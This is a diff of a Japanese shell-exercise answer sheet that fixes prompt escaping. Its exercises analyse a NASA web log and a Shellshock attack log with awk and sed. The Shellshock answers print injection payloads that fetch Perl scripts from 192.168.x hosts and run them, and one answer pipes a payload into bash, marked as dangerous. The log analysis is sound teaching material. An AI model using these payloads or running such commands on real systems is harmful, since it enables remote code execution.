@@ -62,21 +62,21 @@ access.log.shellshock.gzとaccess_log.nasa.gzについて、日付と時刻を�
 
 ```bash
 ###修正前###
-ueda\@tencore:~/tmp/nasa$ zcat access_log.nasa.gz | head -n 1
+ueda@tencore:~/tmp/nasa$ zcat access_log.nasa.gz | head -n 1
 199.72.81.55 - - [01/Jul/1995:00:00:01 -0400] "GET /history/apollo/ HTTP/1.0" 200 6245
 ###修正後###
-ueda\@tencore:~/tmp/nasa$ cat access_log | head -n 1
+ueda@tencore:~/tmp/nasa$ cat access_log | head -n 1
 19950701 000001 199.72.81.55 - - [01/Jul/1995:00:00:01 -0400] "GET /history/apollo/ HTTP/1.0" 200 6245
 ```
 
 <h2>解答</h2>
 
 ```bash
-ueda\@tencore:~/tmp/nasa$ zcat access_log.nasa.gz | awk '{print $4,$0}' |
+ueda@tencore:~/tmp/nasa$ zcat access_log.nasa.gz | awk '{print $4,$0}' |
  sed 's/^\\[//' | awk '{gsub(/[\\/:]/," ",$1);print}' |
  awk '{$2=$2=="Jul"?"07":$2;$2=$2=="Aug"?"08":$2;print}' |
  sed 's;^\\(..\\) \\(..\\) \\(....\\) \\(..\\) \\(..\\) \\(..\\);\\3\\2\\1 \\4\\5\\6;' > access_log
-ueda\@tencore:~/tmp/danger$ zcat access.log.shellshock.gz | awk '{print $4,$0}' |
+ueda@tencore:~/tmp/danger$ zcat access.log.shellshock.gz | awk '{print $4,$0}' |
  sed 's/^\\[//' | awk '{gsub(/[\\/:]/," ",$1);print}' |
  sed -e 's/Sep/09/' -e 's/Oct/10/' -e 's/Nov/11/' -e 's/Dec/12/' |
  sed 's;^\\(..\\) \\(..\\) \\(....\\) \\(..\\) \\(..\\) \\(..\\);\\3\\2\\1 \\4\\5\\6;' > danger_log
@@ -85,8 +85,8 @@ ueda\@tencore:~/tmp/danger$ zcat access.log.shellshock.gz | awk '{print $4,$0}' 
 ちゃんと変換できているか確認する方法は、例えば次の通り。
 
 ```bash
-ueda\@tencore:~/tmp/nasa$ awk '{print $1}' access_log | uniq | sort -u | less
-ueda\@tencore:~/tmp/nasa$ awk '{print $2}' access_log | grep -vE '^[0-9]{6}$'
+ueda@tencore:~/tmp/nasa$ awk '{print $1}' access_log | uniq | sort -u | less
+ueda@tencore:~/tmp/nasa$ awk '{print $2}' access_log | grep -vE '^[0-9]{6}$'
 ```
 
 
@@ -99,7 +99,7 @@ NASAのログを各日付のファイルに分けておきましょう。ログ�
 やり方を知っていれば簡単ですね。
 
 ```bash
-ueda\@tencore:~/tmp/nasa$ cat access_log | awk '{print $0 > $1}' 
+ueda@tencore:~/tmp/nasa$ cat access_log | awk '{print $0 > $1}' 
 ```
 
 
@@ -112,7 +112,7 @@ NASAのログについて、ステータスコードを抽出して、どのコ�
 NASAのログについては、後ろからフィールドを数える方法を使うことに気づけば簡単です。
 
 ```bash
-ueda\@tencore:~/tmp/nasa$ awk '{print $(NF-1)}' access_log |
+ueda@tencore:~/tmp/nasa$ awk '{print $(NF-1)}' access_log |
  LANG=C sort | uniq 
 c-3100522 200
  73070 302
@@ -134,7 +134,7 @@ NASAのログについて、ファイルを開かずに、ログの多い日を�
 lsを使ってサイズを見たら開かないでも見当がつきます。
 
 ```bash
-ueda\@tencore:~/tmp/nasa$ ls -l 1* | sort -k5,5n | tail 
+ueda@tencore:~/tmp/nasa$ ls -l 1* | sort -k5,5n | tail 
 -rw-rw-r-- 1 ueda ueda 9897387 4月 17 15:12 19950830
 -rw-rw-r-- 1 ueda ueda 9946946 4月 17 15:12 19950711
 -rw-rw-r-- 1 ueda ueda 10478436 4月 17 15:12 19950714
@@ -159,7 +159,7 @@ Q3-2については高速な方法を考えてみてください。
 （Q3-1）次のように木曜日。
 
 ```bash
-ueda\@tencore:~/tmp/nasa$ awk '{print $1}' access_log | date -f - "+%w" |
+ueda@tencore:~/tmp/nasa$ awk '{print $1}' access_log | date -f - "+%w" |
  LANG=C sort | uniq -c | sort -k1,1n
  317276 0
  318046 6
@@ -173,7 +173,7 @@ ueda\@tencore:~/tmp/nasa$ awk '{print $1}' access_log | date -f - "+%w" |
 （Q3-2）時間をどう切り出すかが鍵です。
 
 ```bash
-ueda\@tencore:~/tmp/nasa$ awk '{print substr($2,1,2)}' access_log |
+ueda@tencore:~/tmp/nasa$ awk '{print substr($2,1,2)}' access_log |
  sort | uniq -c | sort -k1,1nr | head
  230665 15
  227228 12
@@ -186,7 +186,7 @@ ueda\@tencore:~/tmp/nasa$ awk '{print substr($2,1,2)}' access_log |
  178443 17
  149193 08
 ###データが多いと、sortしない分だけこの方が早い###
-ueda\@tencore:~/tmp/nasa$ time awk '{a[substr($2,1,2)]++}END{for(v in a){print v,a[v]}}' access_log |
+ueda@tencore:~/tmp/nasa$ time awk '{a[substr($2,1,2)]++}END{for(v in a){print v,a[v]}}' access_log |
  sort -k2,2nr | head 
 15 230665
 12 227228
@@ -203,7 +203,7 @@ real	0m1.448s
 user	0m1.387s
 sys	0m0.066s
 ###LANG=Cを指定するとさらに速くなる###
-ueda\@tencore:~/tmp/nasa$ LANG=C time awk '{a[substr($2,1,2)]++}END{for(v in a){print v,a[v]}}' access_log |
+ueda@tencore:~/tmp/nasa$ LANG=C time awk '{a[substr($2,1,2)]++}END{for(v in a){print v,a[v]}}' access_log |
  sort -k2,2nr | head 
 1.24user 0.06system 0:01.30elapsed 99%CPU (0avgtext+0avgdata 1148maxresident)k
 0inputs+0outputs (0major+338minor)pagefaults 0swaps
@@ -226,7 +226,7 @@ ShellShockログ内にあるIPアドレス（IPv4）がすべて192.168.から�
 <h2>解答</h2>
 
 ```bash
-ueda\@remote:~$ zcat access.log.shellshock.gz | grep -Eo '([0-9]+\\.){3}[0-9]+' |
+ueda@remote:~$ zcat access.log.shellshock.gz | grep -Eo '([0-9]+\\.){3}[0-9]+' |
  awk -F. '{print $1,$2}' | uniq
 192 168
 ```
@@ -238,7 +238,7 @@ ShellShockログについて、レスポンスのデータ送信量が大きい�
 <h2>解答</h2>
 
 ```bash
-ueda\@tencore:~/tmp/danger$ zcat access.log.shellshock.gz |
+ueda@tencore:~/tmp/danger$ zcat access.log.shellshock.gz |
  sed 's/^\\([0-9]\\+\\.[0-9]\\+\\.[0-9]\\+\\.[0-9]\\+\\) .*" [0-9][0-9][0-9] \\([0-9]\\+\\) ".*$/\\1 \\2/' |
  sort -k2,2nr | head
 192.168.0.90 234
@@ -262,22 +262,22 @@ NASAのログについて、7月8月のうち、ゼロ件の日を列挙して�
 
 ```bash
 ###ログの存在しない日（解法1: ツーライナーで）###
-ueda\@tencore:~/tmp/nasa$ seq -w 01 31 | awk '{print "199507" $1;print "199508" $1}' | sort > days
-ueda\@tencore:~/tmp/nasa$ awk '{print $1}' access_log | LANG=C sort -u | cat - days |
+ueda@tencore:~/tmp/nasa$ seq -w 01 31 | awk '{print "199507" $1;print "199508" $1}' | sort > days
+ueda@tencore:~/tmp/nasa$ awk '{print $1}' access_log | LANG=C sort -u | cat - days |
  sort | uniq -u
 19950729
 19950730
 19950731
 19950802
 ###Tukubaiでワンライナー###
-ueda\@tencore:~/tmp/nasa$ awk '{print $1}' access_log | LANG=C sort -u |
+ueda@tencore:~/tmp/nasa$ awk '{print $1}' access_log | LANG=C sort -u |
  cat - <(mdate -e 19950701 19950831)| tarr | sort | uniq -u
 19950729
 19950730
 19950731
 19950802
 ###ガチでワンライナー###
-ueda\@tencore:~/tmp/nasa$ awk '{print $1}' access_log | LANG=C sort -u |
+ueda@tencore:~/tmp/nasa$ awk '{print $1}' access_log | LANG=C sort -u |
  cat - <(echo 19950{7,8}{01..31}) | tr ' ' '\\n' | sort | uniq -u
 19950729
 19950730
@@ -296,15 +296,15 @@ ShellShockのログから、（Q7-1）インジェクションが試みられた
 
 ```bash
 ###Q7-1 コードを抽出###
-ueda\@tencore:~/tmp/danger$ cat danger_log | sed 's/^.*()/()/'
+ueda@tencore:~/tmp/danger$ cat danger_log | sed 's/^.*()/()/'
 ###Q7-2 コードの掃除###
-ueda\@tencore:~/tmp/danger$ cat danger_log | sed 's/^.*()/()/' |
+ueda@tencore:~/tmp/danger$ cat danger_log | sed 's/^.*()/()/' |
  sed 's/\\\\"/"/g' | sed 's/\\\\\\\\/\\\\/g' | sed 's/"$//'
 ...
 () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!";system("wget http://192.168.144.163/guide/lx.pl -O /tmp/lx.pl;curl -O /tmp/lx.pl http://192.168.144.163/guide/lx.pl;perl /tmp/lx.pl;rm -rf /tmp/lx.pl*");'
 () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!";system("wget -q http://192.168.63.71/android.txt -O /tmp/android.txt;perl /tmp/android.txt;rm -rf /tmp/android*");'
 ###Q7-3 コードの実行（危ない！）###
-ueda\@tencore:~/tmp/danger$ tail -n 1 danger_log | sed 's/^.*()/()/' |
+ueda@tencore:~/tmp/danger$ tail -n 1 danger_log | sed 's/^.*()/()/' |
  sed 's/\\\\"/"/g' | sed 's/\\\\\\\\/\\\\/g' | sed 's/"$//' |
  sed 's/.........//' | bash -vx
 /usr/bin/perl -e 'print "Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!";system("wget -q http://192.168.63.71/android.txt -O /tmp/android.txt;perl /tmp/android.txt;rm -rf /tmp/android*");'
